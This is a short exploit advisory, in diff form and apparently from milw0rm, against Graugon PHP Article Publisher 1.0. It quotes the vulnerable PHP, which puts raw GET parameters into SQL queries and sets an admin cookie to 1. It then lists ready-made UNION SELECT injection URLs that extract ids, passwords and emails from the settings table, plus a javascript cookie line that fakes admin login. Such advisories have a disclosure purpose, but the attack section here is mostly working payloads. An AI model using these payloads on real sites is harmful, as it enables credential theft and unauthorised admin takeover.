@@ -1,0 +1,47 @@
+#########################################################################################
+[0x01] Informations:
+
+Name           : Graugon PHP Article Publisher 1.0
+Download       : http://www.hotscripts.com/listings/jump/download/88458/
+Vulnerability  : Multiple Sql Injections / Insecure Cookie Handling
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud to be Italian 
+#########################################################################################
+[0x02] Bug:
+
+Bugged Page: index.php [..] admin.php [..] view.php
+
+[Code]
+$c = $_GET['c'];
+
+$query = "SELECT * FROM p_categories WHERE id=$c";
+$result = mysql_query($query);
+[/code]
+
+[code]
+ 
+$TwoMonths = 60 * 60 * 24 * 60 + time(); 
+setcookie(g_admin, 1, $TwoMonths);
+
+[/code]
+
+[code]
+
+$id = $_GET['id']; [..]
+
+$query = "SELECT * FROM p_articles WHERE id=$id";
+$result = mysql_query($query);
+[/code]
+
+#########################################################################################
+[0x03] Exploits:
+
+Exploits: http://victim.it/path/?c=1 union select 0,0,0,concat(id,password,email),0,0 from p_settings
+          http://victim.it/path/view.php?id=1 union select 0,0,0,concat(id,password,email),0,0 from p_settings
+          javascript:document.cookie ="g_admin=1; path=/"
+
+########################################################################################
+
+
+# milw0rm.com [2009-03-02]
